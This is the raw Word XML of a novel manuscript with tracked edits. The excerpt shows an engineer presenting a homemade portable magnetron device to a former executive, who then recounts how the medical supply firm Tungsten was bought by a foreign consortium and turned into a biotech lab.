            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ai</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:ins w:id="213" w:author="TextVet" w:date="2016-03-15T12:16:00Z">
        <w:r w:rsidR="003D73AE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>eclared,</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="214" w:author="TextVet" w:date="2016-03-15T12:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D73AE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">as he </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:ins w:id="215" w:author="TextVet" w:date="2016-03-15T12:16:00Z">
        <w:r w:rsidR="003D73AE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="216" w:author="TextVet" w:date="2016-03-15T12:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003D73AE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:ins w:id="217" w:author="TextVet" w:date="2016-03-15T12:16:00Z">
        <w:r w:rsidR="003D73AE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ting</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> down to join him. “Figured I’d soak in the vibe one last time. Play with the Foosball table. Kick the vending machine.”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gestured at Danny’s bag. “But you didn’t walk away empty-handed, I see.”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Just a souvenir. Something I made during the Naval Base Kitsap contract. Nothing that anyone but me would miss.”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 it Claymore property?”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“Does it seriously matter anymore?”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actually. We’re auctioning off Claymore’s assets. Everything’s up for appraisal. The software, the hardware, the furniture, the company van. It’s all for sale. Including whatever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gazed into the bag’s metal-strewn depths. “For </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sale</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>? You… No. It’s not yours. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> designed and built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For</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Claymore,” Jason insisted.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reached inside and fished out a foot-long, six-inch-wide flared metal tube. Attached was a rubber-coated handle with a plastic trigger near the top. Metal blocks </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">protruded from its back, connected to cables that dangled down into the bag. Danny held the assembly delicately by the pistol grip. His eyes traced the device’s contours like fingertips across a </w:t>
      </w:r>
      <w:commentRangeStart w:id="218"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lover’s body</w:t>
      </w:r>
      <w:commentRangeEnd w:id="218"/>
      <w:r w:rsidR="00DB642D">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="218"/>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is it?”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3-megawatt S-band magnetron fitted to a 24 dB gain extended horn antenna, driven by an LC oscillator that delivers 50-nanosecond pulses at a 5% duty cycle. Its power train is a high-voltage ultracapacitor bank fed by a parallel-wired lithium ion battery pile, with a built-in wall-power converter — which makes the whole machine self-contained, man-portable, and field-rechargeable.”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shook his head. “None of that means anything to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broke his eyes away from the contraption to shoot Jason a cold glare. “Exactly.”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Jason’s face crinkled into a smile. “I see you take pride in your work. Tell you what. Hear me out on this little project. If you decide to accept it, consider your gizmo there as a starting bonus. Sound good?”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put the device back in the bag and gave Jason his attention.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“Tell me, Danny. How much do you know about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“Nothing. I didn’t even know your name until this afternoon. I Googled you, of course. Got a bunch of hits on a company called Tungsten Medical Technologies. Some kind of medical supply retailer?”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nodded. “Yes, Tungsten. That’s what I was hoping to talk about.”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were their head accountant or something,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was their COO. Chief Operations Officer. I was with Tungsten for a long, long time — almost since they started, back in the seventies. We sold high-end surgical equipment and medical tools. We supplied a lot of research labs. It was a good company to work for. Privately owned, friendly, very customer-focused. Good times.”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“I’ve never heard of it before. Is it big?”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“At its height</w:t>
      </w:r>
      <w:ins w:id="219" w:author="TextVet" w:date="2016-03-15T12:20:00Z">
        <w:r w:rsidR="00FC7506">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del w:id="220" w:author="TextVet" w:date="2016-03-15T12:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005D4E52">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">it was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>maybe three hundred people. Mostly sales teams. We had guys who bought equipment from manufacturers, and other guys who’d turn around and sell it to schools and hospitals.”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“So this Tungsten company doesn’t actually </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="221" w:author="TextVet" w:date="2016-03-15T12:22:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>make</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> anything, then?”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shook his head. “Back then, no. We were just re-sellers.”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“Sounds simple, but I feel like I’m missing something,” said Danny. “Why would a customer bother going through a middleman? I mean, if I were a surgeon looking for a shiny new scalpel or something, I’d just go to the manufacturer’s website.”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222" w:author="TextVet" w:date="2016-03-15T12:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C24CC9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Jason answered, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">“And how exactly would you </w:t>
      </w:r>
      <w:ins w:id="223" w:author="TextVet" w:date="2016-03-15T12:23:00Z">
        <w:r w:rsidR="00C24CC9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">have </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:ins w:id="224" w:author="TextVet" w:date="2016-03-15T12:24:00Z">
        <w:r w:rsidR="00C24CC9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ne</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="225" w:author="TextVet" w:date="2016-03-15T12:24:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>that</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in the late seventies?”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laughed </w:t>
      </w:r>
      <w:ins w:id="226" w:author="TextVet" w:date="2016-03-15T12:24:00Z">
        <w:r w:rsidR="006131F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>inwardly</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="227" w:author="TextVet" w:date="2016-03-15T12:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006131F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>at himself</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. It was easy </w:t>
      </w:r>
      <w:del w:id="228" w:author="TextVet" w:date="2016-03-15T12:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006131F4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">for him </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>to forget just how recent the dot-com revolution was. Something as simple and ubiquitous as online shopping was not yet even two decades old.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hit the nail on the head, though,” Jason continued. “The Internet hasn’t been kind to Tungsten. It made our core business model obsolete. Tungsten spent the last ten years in a death spiral. When the recession hit, the company finally fell apart. We laid off almost everybody. I took severance. It was a hard decision, but I could tell we were finished. The company got ready to sell off its stockroom and close its doors.”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it managed to survive?”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“Yes, but… it’s </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="229" w:author="TextVet" w:date="2016-03-15T12:26:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>changed</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Two years ago, some nameless overseas consortium swooped in and bought the company. These guys — Russian, Estonian, something like that — they were able to get it for a steal. They installed this old scientist to run the whole shop. Dr. Pyotr</w:t>
      </w:r>
      <w:ins w:id="230" w:author="TextVet" w:date="2016-03-15T12:26:00Z">
        <w:r w:rsidR="00B47EA6">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Passinsky. The investment consortium wires him money, and he pays the bills and keeps the staff in line.”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there’s still a staff around.”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said Jason. “Dr. Passinsky kept some of the technical salesmen who knew their way around the old equipment. Then he went and hired about a dozen new people</w:t>
      </w:r>
      <w:ins w:id="231" w:author="TextVet" w:date="2016-03-15T12:27:00Z">
        <w:r w:rsidR="00034216">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00034216" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="232" w:author="TextVet" w:date="2016-03-15T12:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00034216">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33" w:author="TextVet" w:date="2016-03-15T12:27:00Z">
        <w:r w:rsidR="00035F25">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>v</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="234" w:author="TextVet" w:date="2016-03-15T12:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00035F25">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>V</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ery pricey people</w:t>
      </w:r>
      <w:ins w:id="235" w:author="TextVet" w:date="2016-03-15T12:27:00Z">
        <w:r w:rsidR="00034216">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="236" w:author="TextVet" w:date="2016-03-15T12:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00034216">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37" w:author="TextVet" w:date="2016-03-15T12:27:00Z">
        <w:r w:rsidR="00034216">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>g</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="238" w:author="TextVet" w:date="2016-03-15T12:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00034216">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>G</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eneticists, chemical engineers, neurobiologists. The consortium apparently has this vision to re</w:t>
      </w:r>
      <w:del w:id="239" w:author="TextVet" w:date="2016-03-15T12:28:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006E4CCE">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vamp Tungsten into a cutting-edge research shop for pharmaceutical biotechnology.”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wistfully. “Heh. Biotech…”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said Jason. “Are you familiar with that technology space at all?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00710EDA" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="240" w:author="TextVet" w:date="2016-03-15T12:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t xml:space="preserve">Smiling distantly, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Danny shook his head</w:t>
      </w:r>
      <w:del w:id="241" w:author="TextVet" w:date="2016-03-15T12:33:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00710EDA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> with a distant smile</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. The very word “biotechnology” conjured images </w:t>
      </w:r>
      <w:commentRangeStart w:id="242"/>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>he</w:t>
      </w:r>
      <w:ins w:id="243" w:author="TextVet" w:date="2016-03-15T12:34:00Z">
        <w:r w:rsidR="00464D64">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="244" w:author="TextVet" w:date="2016-03-15T12:34:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00464D64">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> ha</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:commentRangeEnd w:id="242"/>
      <w:r w:rsidR="00464D64">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="242"/>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">long forgotten. </w:t>
      </w:r>
      <w:ins w:id="245" w:author="TextVet" w:date="2016-03-15T12:31:00Z">
        <w:r w:rsidR="00AD71D0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>B</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="246" w:author="TextVet" w:date="2016-03-15T12:29:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00C94B49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>There was a</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="247" w:author="TextVet" w:date="2016-03-15T12:30:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00AD71D0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> time b</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>efore the Internet boom</w:t>
      </w:r>
      <w:ins w:id="248" w:author="TextVet" w:date="2016-03-15T12:30:00Z">
        <w:r w:rsidR="00C94B49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="249" w:author="TextVet" w:date="2016-03-15T12:30:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00C94B49">
          <w:rPr>
